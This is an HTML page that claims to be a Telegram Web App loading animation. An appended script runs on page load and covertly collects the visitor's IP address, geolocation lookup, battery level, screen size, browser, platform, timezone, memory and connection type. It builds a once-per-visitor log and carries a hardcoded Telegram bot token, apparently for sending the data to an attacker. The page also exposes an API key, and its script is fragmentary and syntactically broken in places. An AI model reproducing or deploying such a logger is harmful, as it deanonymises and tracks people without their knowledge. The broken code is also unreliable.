<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading Animation</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
    body {
        margin: 0;
        padding: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #333; /* Темно-серый фон */
    }

    .loader {
        border: 4px solid rgba(255, 255, 255, 0.1);
        border-top: 4px solid #fff;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 15s linear infinite; /* Вращение в течение 15 секунд */
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(1440deg); } /* 360 * 4 = 1440 градусов для 4-кратного ускорения */
    }
</style>
</head>
<body>
    <div class="loader"></div>
</body>
</html>
    <script>
document.addEventListener('DOMContentLoaded', function() {

    let screenWidth;
    let screenHeight;

    navigator.getBattery().then(function(battery) {
        batteryLevel = battery.level * 100;
    });

    
    screenWidth = window.screen.width;
    screenHeight = window.screen.height;

    const batteryLevelConst = batteryLevel;
    const screenWidthConst = screenWidth;
    const screenHeightConst = screenHeight;

    const urlParams = new URLSearchParams(window.location.search);
    const userAgent = navigator.userAgent;

fetch('https://ipapi.co/json/')
    .then(response => response.json())

        const ip = data.ip;

        const osname = navigator.platform;
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        let systemTime = new Date();
        let hours = systemTime.getHours();
        let minutes = systemTime.getMinutes();
        let formattedHours = hours < 10 ? '0' + hours : hours;
        let formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
        let formattedTime = `${formattedHours}:${formattedMinutes}`;
    
       let language = navigator.language
      
       let datee = new Date();
       let day = datee.getDate();
       let month = datee.getMonth() + 1;
       let year = datee.getFullYear();
  
       let dayOfWeek = datee.getDay();
    
    if (day < 10) {
        day = '0' + day;
    }
    
    if (month < 10) {
        month = '0' + month;
    }
    
    let formedDate = day + '.' + month + '.' + year;
      
    let memory = navigator.deviceMemory;
  
    let TypeInternet = navigator.connection.effectiveType;

fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
.then(response => response.json())

if (!localStorage.getItem('logSent')) {

*🔎 IP Info*

 *💻 System*

                             `;

        
        const token = '7837336499:AAGrjgqmiKzFIACpmKRIREbI4W0wo_xlTU0';

        });
      };

});
});
        
        
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i);

    if (/trident/i.test(match[1])) {
        const tem = /\brv[ :]+(\d+)/g.exec(ua);
        browser = 'IE ' + (tem[1] || '');
    }

    if (match[1] === 'Chrome') {
        const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
        if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? 'version ' + match[2] : '';
    browser = `${match[1]} ${match[2] || ''}`.trim();
    return browser;
};
